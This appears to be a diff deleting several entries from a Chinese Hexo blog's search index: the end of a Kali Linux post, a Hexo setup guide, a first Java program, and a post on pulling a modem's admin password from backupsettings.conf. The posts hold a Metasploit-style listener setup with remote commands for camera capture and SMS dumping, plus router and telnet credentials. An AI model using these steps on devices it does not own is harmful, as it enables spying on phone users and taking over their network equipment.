-<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
-set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
-app_list # 安装的软件列表
-webcam_snap # 打开摄像头并拍照
-dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-</li>
-</ul>
-<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo-开源框架-创建博客</title>
-    <url>/2020/08/26/%E5%88%A9%E7%94%A8hexo-%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6-%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h1 id="hexo-开源框架-创建博客"><a href="#hexo-开源框架-创建博客" class="headerlink" title="hexo-开源框架-创建博客"></a>hexo-开源框架-创建博客</h1><h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p> 现在随着计算机的飞速发展，拥有一个属于自己的博客，是一件非常平常的事。<br> 使用hexo搭建一个属于自己的个人博客，是即快捷又美观的一种方式，也是非常<br> 受到人们的喜爱的。</p>
-<h2 id="hexo-介绍"><a href="#hexo-介绍" class="headerlink" title="hexo 介绍"></a>hexo 介绍</h2><p> Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客<br> 的首选框架。这里我们选用的是GitHub，你没看错，全球最大的代码交流网站。Hexo同时也是GitHub上的开源项目，参见：hexojs/<br> hexo 如果想要更加全面的了解Hexo，可以到其官网 Hexo 了解更多的细节，因为Hexo的创建者是台湾人，对中文的支持很友好，<br> 可以选择中文进行查看。这里，默认各位猿/媛儿都知道GitHub就不再赘述。</p>
-<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p> Git 的安装方法可以在 <a href="https://www.baidu.com/">这里</a> 找到，我就不提太多了，主要说一下安装完成后的各项配置。<br> Git 在提交更改的时候，会需要提交者的邮箱和用户名，这可以通过以下命令来设置：<br> <a href="https://git-scm.com/downloads">Git下载连接</a><br> </p><pre class="line-numbers language-none"><code class="language-none">git config --global user.email "Your email 你的邮箱"
-git config --global user.name "Your username 你的用户名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br> 这样会进行全局设置，即以后不管在什么项目下，都会使用这样的配置来提交。而如果想要单独为某一个项目（例如个人博客）配置，<br> 可以删除 –global 选项，但需要在项目文件夹中进行。<br> 设定完成后可以将git安装目录下的 bin 目录的地址添加到环境变量<p></p>
-<pre class="line-numbers language-none"><code class="language-none">GIT_HOME
-盘符:\Program Files\Git\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>在环境变量 Path中添加</p>
-<pre class="line-numbers language-none"><code class="language-none">%GIT_HOME%\bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="安装Node-JS"><a href="#安装Node-JS" class="headerlink" title="安装Node JS"></a>安装Node JS</h3><ul>
-<li>百度搜索NodeJS,找到官网–下载–即可<br><a href="%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1UsdWOjtRbF5NpERJa_-FgQ">windows 下 安装包分享链接</a><br>提取码: n6o8</li>
-<li>安装过程很简单，一直无脑下一步就行</li>
-<li>安装完成后可以查看一下是否安装的版本<pre class="line-numbers language-none"><code class="language-none">node -v #查看node版本
-npm  -v  #查看npm版本  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="安装cnmp"><a href="#安装cnmp" class="headerlink" title="安装cnmp"></a>安装cnmp</h3></li>
-<li>这里使用cnmp来安装 hexo 框架所以要先安装cnmp,但是由于墙的原因,这里使用淘宝的镜像下载安装  </li>
-<li>打开命令提示符，输入以下代码 <pre class="line-numbers language-none"><code class="language-none">npm install -g cnpm --registry=http://registry.npm.taobao.org #安装淘宝的cnpm 管理器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>安装完成后查看模块版本<pre class="line-numbers language-none"><code class="language-none">cnpm -v #查看cnpm版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="安装hexo框架"><a href="#安装hexo框架" class="headerlink" title="安装hexo框架"></a>安装hexo框架</h3><pre class="line-numbers language-none"><code class="language-none">cnpm install -g hexo-cli #安装hexo框架<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>查看hexo版本<pre class="line-numbers language-none"><code class="language-none">hexo -v #查看hexo版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="初始化博客"><a href="#初始化博客" class="headerlink" title="初始化博客"></a>初始化博客</h3></li>
-<li>在电脑任意一个位置或你想要的位置建立一个文件夹 例如: blog<pre class="line-numbers language-none"><code class="language-none">mkdir blog # 创建文件夹
-cd blog # 进入到文件夹里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-执行<pre class="line-numbers language-none"><code class="language-none">hexo init #生成博客 初始化博客<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-但是由于网络原因，很长时间都不会下载完成，如果你和我一样一直卡在这里，所以可以使用git 进行一个初始化的克隆<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hexojs/hexo-starter.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-然后在当前文件夹的命令行内执行 以在本地启动hexo <pre class="line-numbers language-none"><code class="language-none">hexo s # 在本地启动hexo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-或者<pre class="line-numbers language-none"><code class="language-none">hexo server # 在本地启动hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-这个时候会报错并且会启动失败，你会得到这样的提示<pre class="line-numbers language-none"><code class="language-none">ERROR Cannot find module 'hexo' from 'X:\blog'
-ERROR Local hexo loading failed in X:\blog
-ERROR Try running: 'rm -rf node_modules &amp;&amp; npm install --force'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-这是因为上面那个github项目没有module 导致的所以你可以执行<pre class="line-numbers language-none"><code class="language-none">npm install --force # 下载需要的moudel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-来进行下载需要的moudel<br>这时你再执行上面的启动命令,就能启动hexo博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-我们访问 <a href="http://localhost:4000/">http://localhost:4000/</a> 就可以发现啥也没有 空白的页面<br>这是因为你的博客里没有主题 在hexo 框架里面有一个themes的文件夹 这个文件夹里放的就是主题，因此我们只要下载一个主题<br>就行，我们访问hexo的官方网站<a href="https://hexo.io/themes/">https://hexo.io/themes/</a>在里面选择一款自己喜欢的进行<br>下载即可。<br>利用git 下载<pre class="line-numbers language-none"><code class="language-none">cd themes
-git clone git@github.com:fluid-dev/hexo-theme-fluid.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-此时还不能看到主题，回到博客的根下 <pre class="line-numbers language-none"><code class="language-none">cd ../<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-用EidtPuls或任意文本编辑器打开_config.yml 在里面找到 Themes: <a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 将下面的<pre class="line-numbers language-none"><code class="language-none"># Extensions
-## Plugins: https://hexo.io/plugins/
-## Themes: https://hexo.io/themes/
-theme: landscape<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-改为<pre class="line-numbers language-none"><code class="language-none"># Extensions
-## Plugins: https://hexo.io/plugins/
-## Themes: https://hexo.io/themes/
-theme: hexo-theme-fluid #这个就是主题放的文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-再次启动hexo 就可以访问博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-但是此时只有一个帖子时这个hello,world 里面是这个hexo 快速启动的用法 可以看一下里面说的我这里就不再描述<h3 id="将博客推送到远端服务器上"><a href="#将博客推送到远端服务器上" class="headerlink" title="将博客推送到远端服务器上"></a>将博客推送到远端服务器上</h3></li>
-<li>这里使用的服务器是我们的github <h3 id="创建可以访问的github仓库"><a href="#创建可以访问的github仓库" class="headerlink" title="创建可以访问的github仓库"></a>创建可以访问的github仓库</h3></li>
-<li>什么？你还没有github 账号？！ 赶紧去注册一个</li>
-<li>登录github账号之后新建一个仓库<pre class="line-numbers language-none"><code class="language-none">名字是你账号的名字(必须是你账号的名字).github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-例如:<pre class="line-numbers language-none"><code class="language-none">xxxxxxxx.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>权限设置为公开<br>可以添加一个备注，比如我的就是 我的hexo博客</li>
-<li>同时这也是后面访问的地址<br>建立好后在博客的根目录用EidtPuls或任意文本编辑器打开_config.yml<br>找到最后面的<pre class="line-numbers language-none"><code class="language-none"># Deployment
-## Docs: https://hexo.io/docs/one-command-deployment
-deploy:
-  type: ''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-修改为<pre class="line-numbers language-none"><code class="language-none"># Deployment
-## Docs: https://hexo.io/docs/deployment.html
-deploy:
-  type: git
-  repo: https://github.com/xxxxxxx/xxxxxxxx.github.io.git # 刚才建立仓库的地址
-  branch: master # 这个是git的分支 不写 默认主分支
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>由于hexo 没有办法提交到github 所以要安装一个插件<pre class="line-numbers language-none"><code class="language-none">cnpm install --save hexo-deployer-git #在blog目录下安装git部署插件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-安装完成之后只想如下命令<pre class="line-numbers language-none"><code class="language-none">hexo g 
-hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-在执行第二个命令时需要输入github的用户名和密码<br>命令执行完成之后就可以查看了</li>
-</ul>
-<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>网站建设与优化</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
-        <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>回忆第一个java程序</title>
-    <url>/2020/09/03/%E5%9B%9E%E5%BF%86%E7%AC%AC%E4%B8%80%E4%B8%AAjava%E7%A8%8B%E5%BA%8F/</url>
-    <content><![CDATA[<h1 id="回忆第一个java程序"><a href="#回忆第一个java程序" class="headerlink" title="回忆第一个java程序"></a>回忆第一个java程序</h1><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文用于回忆四年前第一次编写Java程序,同时写给初学者和自己。</p>
-<h3 id="1-创建Java环境"><a href="#1-创建Java环境" class="headerlink" title="1. 创建Java环境"></a>1. 创建Java环境</h3><h4 id="1-下载及安装JDK"><a href="#1-下载及安装JDK" class="headerlink" title="1. 下载及安装JDK"></a>1. 下载及安装JDK</h4><ul>
-<li>要想运行Java程序或者编译Java程序首先得有Java环境</li>
-<li>这里使用 JDK 8<br><a href="https://download.oracle.com/otn/java/jdk/8u251-b08/3d5a2bb8f8d4428bbe94aed7ec7ae784/jdk-8u251-windows-x64.exe">官网下载</a><br><a href="https://pan.baidu.com/s/1f1EDWvG-GzpQRJaC_W4SpA">某盘下载</a>提取码：9pj1<br>如果不行，<a href="https://pan.baidu.com/s/1_XgfYFPVe_sZqOVrTHK_Sw">备用链接，某盘下载</a>提取码：trs0<br>下载完成后，双击运行即可<h4 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h4></li>
-<li>右击此电脑在弹出的快捷菜单中选择属性在弹出的系统属性对话框中选择环境变量，在弹出的环境变量的对话框中选择 新建<br>输入以下代码  <pre class="line-numbers language-Text" data-language="Text"><code class="language-Text">JAVA_HOME
-C:\Program Files\Java\jdk1.8.0_111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-如图：<br><img src="https://img-blog.csdnimg.cn/20200903172719470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center"></li>
-<li>在环境变量对话框中找到Path  </li>
-<li>点击编辑,找到空白处点击编辑文本 输入  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span>JAVA_HOME<span class="token operator">%</span><span class="token operator">/</span>bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://img-blog.csdnimg.cn/20200903172908828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center">### 验证Java 环境是否安装好<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-得到如下提示<pre class="line-numbers language-Text" data-language="Text"><code class="language-Text">java version "1.8.0_231"
-Java(TM) SE Runtime Environment (build 1.8.0_231-b11)
-Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
-<li>说明JAVA环境安装成功<h3 id="创建第一个JAVA程序"><a href="#创建第一个JAVA程序" class="headerlink" title="创建第一个JAVA程序"></a>创建第一个JAVA程序</h3></li>
-<li>别人都是在控制台中输出hello,world ，这里就偏偏不一样，<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">😁</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span></li>
-<li>在任意一个位置新建一个文本文档，鼠标左键慢速双击两下重命名为Test用任意编辑器打开 ,输入以下代码:rofl:<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Java is the best language in the world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>Win+R 打开运行对话框输入cmd 输入命令:rofl:<pre class="line-numbers language-java" data-language="java"><code class="language-java">javac <span class="token class-name">Test</span><span class="token punctuation">.</span>java
-java <span class="token class-name">Test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-控制台就会打出<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">C:\Users\Administrator\Desktop&gt;java Test
-Java is the best language in the world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="博客持续更新中……-rofl-rofl-rofl"><a href="#博客持续更新中……-rofl-rofl-rofl" class="headerlink" title="博客持续更新中…….:rofl::rofl::rofl:"></a>博客持续更新中…….<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span></h2></li>
-</ul>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>Java 基础</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>代码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>获取路由器（光猫）管理员权限</title>
-    <url>/2020/08/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<h1 id="获取路由器（光猫）管理员权限"><a href="#获取路由器（光猫）管理员权限" class="headerlink" title="获取路由器（光猫）管理员权限"></a>获取路由器（光猫）管理员权限</h1><h3 id="文章参考自-https-www-cnblogs-com-784040932-p-5922735-html"><a href="#文章参考自-https-www-cnblogs-com-784040932-p-5922735-html" class="headerlink" title="文章参考自 https://www.cnblogs.com/784040932/p/5922735.html"></a>文章参考自 <a href="https://www.cnblogs.com/784040932/p/5922735.html">https://www.cnblogs.com/784040932/p/5922735.html</a></h3><h4 id="我家的光猫图片"><a href="#我家的光猫图片" class="headerlink" title="我家的光猫图片"></a>我家的光猫图片</h4><p><img src="https://img-blog.csdnimg.cn/20200618221056915.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="我家的光猫图片"></p>
-<ul>
-<li>1.用光猫背后的useradmin 帐号和密码登录 <a href="http://192.168.1.1/">http://192.168.1.1/</a></li>
-</ul>
-<hr>
-<ul>
-<li>2.然后在浏览器地址栏中输入<a href="http://192.168.1.1/backupsettings.conf%E4%BB%A5%E4%B8%8B%E8%BD%BDbackupsettings.conf">http://192.168.1.1/backupsettings.conf以下载backupsettings.conf</a></li>
-</ul>
-<hr>
-<ul>
-<li>3.用文本编辑器打开此处我使用的是EditPlus<br><img src="https://img-blog.csdnimg.cn/20200618225422594.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<hr>
-<ul>
-<li>4.<kbd>Ctrl</kbd>+<kbd>F</kbd>,调出搜索框 输入admin,点击查找<br><img src="https://img-blog.csdnimg.cn/20200618225524541.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<hr>
-<ul>
-<li>5.结果如下：<br><img src="https://img-blog.csdnimg.cn/20200618225540253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><pre class="line-numbers language-none"><code class="language-none">&lt;Web&gt;
-   &lt;UserPassword&gt;w7us0h6j&lt;/UserPassword&gt;
-   &lt;AdminPassword&gt;cuadmin97973099&lt;/AdminPassword&gt;
-   &lt;MenuBtnId&gt;2&lt;/MenuBtnId&gt;
- &lt;/Web&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>第一个是你的普通用户的密码如果不出意外是你的路由器密码，如果不是就是默认密码</li>
-<li>第二个则是管理员密码，复制粘贴即可以管理员的身份登录到光猫里面</li>
-<li>第三个我也不知道 似乎是第几个按钮之类的  </li>
-</ul>
-<hr>
-<ul>
-<li>注意： <a href="%E6%88%91%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AAXML%E6%A0%BC%E5%BC%8F%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%85%E5%87%AD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%91%E5%B0%B1%E6%89%BE%E5%88%B0%E4%BA%86%E6%88%91%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF">^RUNOOB</a>  </li>
-</ul>
-<hr>
-<ul>
-<li>另外，在配置文件中我还发现了这个<pre class="line-numbers language-none"><code class="language-none">&lt;Telnet&gt;
-      &lt;UserName&gt;telnetadmin&lt;/UserName&gt;
-      &lt;Password&gt;telnetadmin&lt;/Password&gt;
-&lt;/Telnet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>虽然不知道这是啥但是我猜和telnet的登录有关系，但是我却不会用似乎无法登录</li>
-<li>具体方法可以看一下其他人的博客，因为我失败了就不分享方法了</li>
-</ul>
-<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>其他技术</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>破解</tag>
       </tags>
   </entry>
   <entry>
